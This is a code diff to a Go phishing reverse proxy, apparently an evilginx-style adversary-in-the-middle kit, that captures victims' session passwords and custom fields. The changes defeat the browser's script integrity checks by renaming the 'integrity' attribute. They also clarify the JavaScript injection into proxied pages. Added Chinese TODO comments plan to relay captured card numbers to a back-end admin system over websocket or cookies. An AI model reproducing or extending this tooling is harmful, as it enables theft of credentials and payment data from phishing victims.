@@ -682,6 +682,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
+						//TODO  这里通过ws 把卡号等数据传给后台管理系统
+						//TODO  也可以通过cookie传递
 						if json_re.MatchString(contentType) {
 
 							if pl.username.tp == "json" {
@@ -700,6 +702,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -710,6 +713,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
+										// TODO 处理custom参数
+
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -790,6 +795,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
+												// TODO 处理custom参数
+
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -1018,8 +1025,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			body, err := ioutil.ReadAll(resp.Body)
 
 			//TODO 先把integrity   js校验干掉
-			re := regexp.MustCompile(`integrity=".*?"`)
-			body = []byte(re.ReplaceAllString(string(body), ""))
+			//re := regexp.MustCompile(`integrity=".*?"`)
+			//body = []byte(re.ReplaceAllString(string(body), ""))
+			re := regexp.MustCompile(`integrity`)
+			body = []byte(re.ReplaceAllString(string(body), "integrit"))
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1191,7 +1200,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								body = p.injectJavascriptIntoHead(body, "", fmt.Sprintf("/ss/%s/%s.js", s.Id, js_id))
 							}
 							// 默认都会注入这个js /ss/x.js   DYNAMIC_REDIRECT_JS
-							// TODO 搞不懂这个目的
+							// 通过引入js url的方式，注入js脚本
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/ss/%s.js", s.Id))
 						}
@@ -1318,7 +1327,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 }
 
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
-	if mime == "text/redirect" {
+	if mime == "redirect" {
 		// proxy 重定向
 		//resp := goproxy.NewResponse(req, mime, http.StatusMovedPermanently, "")
 		//
